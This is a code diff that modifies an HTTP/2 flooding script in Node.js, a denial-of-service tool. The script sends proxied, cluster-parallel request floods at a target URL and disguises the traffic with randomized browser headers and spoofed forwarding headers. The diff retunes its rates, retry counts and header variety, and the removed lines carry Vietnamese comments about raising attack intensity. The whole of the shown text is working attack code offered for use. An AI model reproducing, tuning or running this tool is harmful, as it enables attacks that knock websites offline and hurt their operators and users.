@@ -50,8 +50,8 @@ function randstr(length) {
 const args = {
     target: process.argv[2],
     time: parseInt(process.argv[3]),
-    Rate: parseInt(process.argv[4]) || 500, // Tăng Rate mặc định lên 500
-    threads: parseInt(process.argv[5]) || 32, // Tăng threads mặc định lên 32
+    Rate: parseInt(process.argv[4]),
+    threads: parseInt(process.argv[5]),
     proxyFile: process.argv[6]
 };
 
@@ -61,24 +61,15 @@ if (!parsedTarget.protocol || !parsedTarget.host) {
     process.exit(1);
 }
 
-const sig = ['ecdsa_secp256r1_sha256', 'rsa_pkcs1_sha384', 'rsa_pkcs1_sha512', 'ecdsa_secp384r1_sha384'];
-const accept_header = [
-    '*/*',
-    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-    'application/json, text/javascript, */*; q=0.01',
-    'text/plain, */*; q=0.01'
-];
-const lang_header = ['en-US', 'vi-VN', 'zh-CN', 'fr-FR', 'es-ES'];
-const encoding_header = ['gzip, deflate, br', 'deflate', 'gzip', 'br'];
-const version = ['"Google Chrome";v="113"', '"Microsoft Edge";v="113"', '"Firefox";v="91"', '"Safari";v="15"'];
+const sig = ['ecdsa_secp256r1_sha256', 'rsa_pkcs1_sha384', 'rsa_pkcs1_sha512'];
+const accept_header = ['*/*', 'text/html', 'application/json'];
+const lang_header = ['en-US', 'vi-VN', 'zh-CN'];
+const encoding_header = ['gzip, deflate, br', 'deflate', 'gzip'];
+const version = ['"Google Chrome";v="113"', '"Microsoft Edge";v="113"', '"Firefox";v="91"'];
 const rateHeaders = [
     { "akamai-origin-hop": randstr(12) },
     { "via": randstr(12) },
-    { "x-forwarded-for": randstr(12) },
-    { "referer": `https://${randstr(10)}.com` },
-    { "cache-control": randomElement(["no-cache", "max-age=0"]) },
-    { "pragma": "no-cache" },
-    { "x-requested-with": "XMLHttpRequest" }
+    { "x-forwarded-for": randstr(12) }
 ];
 
 const siga = randomElement(sig);
@@ -99,7 +90,7 @@ if (cluster.isMaster) {
     }
     setTimeout(() => process.exit(0), args.time * 1000);
 } else {
-    setInterval(runFlooder, 50); // Giảm thời gian chu kỳ xuống 50ms
+    setInterval(runFlooder, 100);
 }
 
 class NetSocket {
@@ -153,11 +144,7 @@ headers["sec-ch-ua-platform"] = "Windows";
 headers["accept-encoding"] = encoding;
 headers["accept-language"] = lang;
 headers["accept"] = accept;
-headers["user-agent"] = randomElement([
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15"
-]);
+headers["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36";
 
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
@@ -175,7 +162,7 @@ function runFlooder() {
     };
 
     let retryCount = 0;
-    const maxRetries = 10; // Tăng số lần thử lại lên 10
+    const maxRetries = 5;
 
     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) {
@@ -183,7 +170,7 @@ function runFlooder() {
             if (retryCount < maxRetries) {
                 retryCount++;
                 console.error(`Retrying (${retryCount}/${maxRetries}) for ${proxyAddr}: ${error}`);
-                setTimeout(runFlooder, 500); // Giảm thời gian chờ khi retry
+                setTimeout(runFlooder, 1000);
             } else {
                 console.error(`Max retries reached for ${proxyAddr}`);
             }
@@ -193,7 +180,7 @@ function runFlooder() {
         const tlsOptions = {
             secure: true,
             ALPNProtocols: ['h2', 'http/1.1'],
-            ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384',
+            ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256',
             ecdhCurve: 'auto',
             host: parsedTarget.host,
             servername: parsedTarget.host,
@@ -207,7 +194,7 @@ function runFlooder() {
             protocol: "https:",
             settings: {
                 headerTableSize: 65536,
-                maxConcurrentStreams: 256, // Tăng số lượng stream đồng thời
+                maxConcurrentStreams: 112,
                 initialWindowSize: 6291456,
                 maxHeaderListSize: 65536,
                 enablePush: false
@@ -233,7 +220,7 @@ function runFlooder() {
                     });
                     request.end();
                 }
-            }, 50); // Đồng bộ với setInterval của runFlooder
+            }, 100);
             setTimeout(() => clearInterval(IntervalAttack), args.time * 1000);
         });
 
@@ -241,14 +228,14 @@ function runFlooder() {
             client.destroy();
             tlsConn.destroy();
             connection.destroy();
-            setTimeout(runFlooder, 500);
+            setTimeout(runFlooder, 1000);
         });
 
         client.on("close", () => {
             client.destroy();
             tlsConn.destroy();
             connection.destroy();
-            setTimeout(runFlooder, 500);
+            setTimeout(runFlooder, 1000);
         });
     });
 }
